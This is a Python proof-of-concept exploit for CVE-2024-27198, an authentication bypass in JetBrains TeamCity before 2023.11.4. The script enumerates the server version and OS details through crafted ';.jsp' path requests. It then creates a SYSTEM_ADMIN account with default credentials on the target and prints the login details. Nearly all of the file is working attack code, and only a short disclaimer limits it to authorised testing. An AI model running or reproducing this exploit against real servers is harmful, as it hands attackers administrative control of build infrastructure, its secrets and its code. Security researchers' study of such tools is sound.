"""
Proof of Concept (PoC) for CVE-2024-27198
=========================================
CVE ID: CVE-2024-27198
Vulnerability Type: Authentication Bypass and Remote Code Execution (RCE)
Affected Product: JetBrains TeamCity versions earlier than 2023.11.4
Impact: Enables attackers to bypass authentication and execute arbitrary code on the TeamCity server without authentication. This vulnerability may lead to unauthorized access, data exfiltration, and potentially full control over the affected system.

Researcher: Maxime Beauchamp
Inspiration: Based on a vulnerability and exploitation techniques detailed in the Metasploit module and other public disclosures. For further information, refer to Rapid7's analysis at 'https://www.rapid7.com/db/modules/exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198/'
Website: 'https://www.maximebeauchamp.com'

Requirements:
- Python 3.x
- Network access to a vulnerable JetBrains TeamCity instance (version earlier than 2023.11.4).

Usage:
Run 'python POC_CVE-2024-27198.py --target <target_url> [--username <username>] [--password <password>] [--debug]' to execute the PoC.

Options:
--target    Specifies the URL of the target TeamCity server. This argument is required.
--username  Specifies the username for the new admin user. If not provided, a default username ("OctoPOC2") is used.
--password  Specifies the password for the new admin user. If not provided, a default password ("P!CP@CP0C") is used.
--debug     Enables detailed output for debugging purposes, providing insights into the exploitation process and responses from the target.

Disclaimer:
This Proof of Concept is intended for educational purposes or authorized security testing only. The creator assumes no liability for any misuse or damage resulting from this script. Users are advised to adhere to ethical guidelines and legal requirements while utilizing this tool.
"""

import random
import string
from urllib.parse import urljoin
import xml.etree.ElementTree as ET
import argparse
import requests

class OutputFormatter:
    """Handles formatting of script output with colors and icons."""
    RESET = "\033[0m"
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    ICONS = {
        "info": "[*]",
        "success": "[+]",
        "error": "[-]",
        "debug": "[DEBUG]",
        "alert": "[!]"
    }

    @staticmethod
    def color_text(text, color):
        """Adds ANSI color codes to the text."""
        return color + text + OutputFormatter.RESET

    @staticmethod
    def print_info(text):
        """Prints an information message."""
        print(f"{OutputFormatter.color_text(OutputFormatter.ICONS['info'], OutputFormatter.BLUE)} {OutputFormatter.color_text(text, OutputFormatter.BLUE)}")

    @staticmethod
    def print_success(text):
        """Prints a success message."""
        print(f"{OutputFormatter.color_text(OutputFormatter.ICONS['success'], OutputFormatter.GREEN)} {OutputFormatter.color_text(text, OutputFormatter.GREEN)}")

    @staticmethod
    def print_error(text):
        """Prints an error message."""
        print(f"{OutputFormatter.color_text(OutputFormatter.ICONS['error'], OutputFormatter.RED)} {OutputFormatter.color_text(text, OutputFormatter.RED)}")

    @staticmethod
    def print_debug(text):
        """Prints a debug message."""
        print(f"{OutputFormatter.color_text(OutputFormatter.ICONS['debug'], OutputFormatter.YELLOW)} {OutputFormatter.color_text(text, OutputFormatter.YELLOW)}")
        
    @staticmethod
    def print_alert(text):
        """Prints an alert message."""
        print(f"{OutputFormatter.color_text(OutputFormatter.ICONS['alert'], OutputFormatter.RED)} {OutputFormatter.color_text(text, OutputFormatter.RED)}")


def display_banner():
    banner_text = """
     ██████╗  ██████╗████████╗ ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗██╗   ██╗
    ██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗████╗  ██║╚██╗ ██╔╝
    ██║   ██║██║        ██║   ██║   ██║██╔████╔██║███████║██╔██╗ ██║ ╚████╔╝ 
    ██║   ██║██║        ██║   ██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║  ╚██╔╝  
    ╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║   ██║   
     ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   
                                                                           
    CVE-2024-27198 Exploitation (TeamCity Authentication Bypass)
    By Maxime Beauchamp - https://www.maximebeauchamp.com
    """
    print(banner_text)

def parse_arguments():
    parser = argparse.ArgumentParser(description='Exploit for JetBrains TeamCity Authentication Bypass and RCE (CVE-2024-27198)')
    parser.add_argument('-t', '--target', required=True, help='The URL of the target')
    parser.add_argument('-u', '--username', default='OctoPOC', help='Username for the new admin user (default: OctoPOC)')
    parser.add_argument('-p', '--password', default='P!CP@CP0C', help='Password for the new admin user (default: P!CP@CP0C)')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug output for detailed information.')
    parser.add_argument('-c', '--check', action='store_true', help='Only check if the target is vulnerable, do not exploit.')
    return parser.parse_args()


def generate_random_string(length=8):
    """Generates a random alphanumeric string of specified length."""
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))


def generate_random_params(n=4):
    """Generates a string of random parameters formatted for a URL query string."""
    if n % 2 != 0:
        raise ValueError("The number of parameters must be even.")

    params = []
    for _ in range(n // 2):
        key = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(5, 10)))
        value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5, 10)))
        params.append(f"{key}={value}")

    return '&'.join(params)


def normalize_uri(*parts):
    """Joins parts of the URI cleanly."""
    return '/'.join(part.strip('/') for part in parts)


def check_auth_bypass_vulnerability(session, base_url, target_uri_path, debug=False):
    """Checks if the target is vulnerable to authentication bypass and gathers version and OS info."""

    random_params = generate_random_string() + "?" + generate_random_params(n=6)
    jsp_rand = ";" + generate_random_string() + ".jsp&" + generate_random_string() + "=" + generate_random_string()
    
    OutputFormatter.print_info("===== Enumeration Phase =====")
    OutputFormatter.print_info("Gathering server and OS information...\n")

    def debug_print(message):
        """Prints the message if debug mode is enabled."""
        if debug:
            OutputFormatter.print_debug(message)
            
    # Get server version
    server_info_path = normalize_uri(target_uri_path, 'app', 'rest', 'server')
    full_url = urljoin(base_url, random_params + "&jsp=" + server_info_path + jsp_rand)
    debug_print(f"Requesting server version: {full_url}")
    response = session.get(full_url)
    debug_print(f"Response status: {response.status_code}")
    debug_print(f"Response body: {response.text}")

    # Parse server version
    if response.status_code == 200:
        try:
            server_version = ET.fromstring(response.content).attrib['version']
            OutputFormatter.print_success(f"Detected TeamCity Server Version: {server_version}")
        except ET.ParseError:
            OutputFormatter.print_error("Failed to parse server version information.")
            return False

    # Get OS information
    os_info_path = normalize_uri(target_uri_path, 'app/rest/debug/jvm/systemProperties')
    full_url = urljoin(base_url, random_params + "&jsp=" + os_info_path + jsp_rand)
    response = session.get(full_url)
    debug_print(f"Requesting OS informations: {full_url}")
    debug_print(f"Response status: {response.status_code}")
    debug_print(f"Response body: {response.text}")

    # Parse OS information
    if response.status_code == 200:
        try:
            root = ET.fromstring(response.content)
            os_arch = root.find(".//property[@name='os.arch']").get('value')
            os_name = root.find(".//property[@name='os.name']").get('value')
            os_version = root.find(".//property[@name='os.version']").get('value')

            OutputFormatter.print_success(f"Detected OS Architecture: {os_arch}")
            OutputFormatter.print_success(f"Detected OS Name: {os_name}")
            OutputFormatter.print_success(f"Detected OS Version: {os_version}\n")
        except ET.ParseError:
            OutputFormatter.print_error("Failed to parse OS information.")
            return False

    OutputFormatter.print_info("===== Vulnerability Check Phase =====")
    OutputFormatter.print_info("Testing for authentication bypass...\n")
    
    debug_print(f"Response received: {response.status_code}")
    if response.status_code == 200:
        return True
    elif response.status_code == 403:
        OutputFormatter.print_error("Target is likely not vulnerable.")
        return False
    else:
        debug_print(f"Received unexpected HTTP status code: {response.status_code}")
        return False

def exploit(session, base_url, username, password, debug=False):
    
    def debug_print(message):
        """Prints the message if debug mode is enabled."""
        if debug:
            OutputFormatter.print_debug(message)
    
    OutputFormatter.print_info("===== Exploitation Phase =====")
    
    vulnerable_endpoint = "/pwned?jsp=/app/rest/users;.jsp"
    full_url = urljoin(base_url, vulnerable_endpoint)
    create_user_data = {
        "username": username,
        "password": password,
        "email": f"{username}@mydomain.com",
        "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
    }
    headers = {"Content-Type": "application/json"}
    
    debug_print(f"Exploitation URL: {full_url}")
    debug_print(f"Request Headers: {headers}")
    debug_print(f"Request Body: {create_user_data}")
    
    # Send the exploit request
    response = session.post(full_url, json=create_user_data, headers=headers)
    
    debug_print(f"Response status: {response.status_code}")
    debug_print(f"Response body: {response.text}")

    if response.status_code == 200:
        OutputFormatter.print_success("Successfully created an admin account.\n")
        OutputFormatter.print_info(f"Username: {username}")
        OutputFormatter.print_info(f"Password: {password}")
        OutputFormatter.print_info(f"Login URL: {base_url}/login.html\n")
    else:
        OutputFormatter.print_error(f"Failed to create a new admin user. Server responded with HTTP {response.status_code}")


def main():
    display_banner()
    args = parse_arguments()
    session = requests.Session()
    base_url = args.target.rstrip('/')

    # Check if the target is vulnerable
    is_vulnerable = check_auth_bypass_vulnerability(session, base_url, '/', debug=args.debug)

    if is_vulnerable and not args.check:
        OutputFormatter.print_alert("The target is vulnerable to CVE-2024-27198.\n")
        exploit(session, base_url, args.username, args.password, debug=args.debug)
    elif is_vulnerable and args.check:
        OutputFormatter.print_alert("The target is vulnerable to CVE-2024-27198. No exploitation was attempted as per the --check flag.\n")
    else:
        OutputFormatter.print_error("The target is not vulnerable or could not be verified.")

    session.close()

if __name__ == "__main__":
    main()
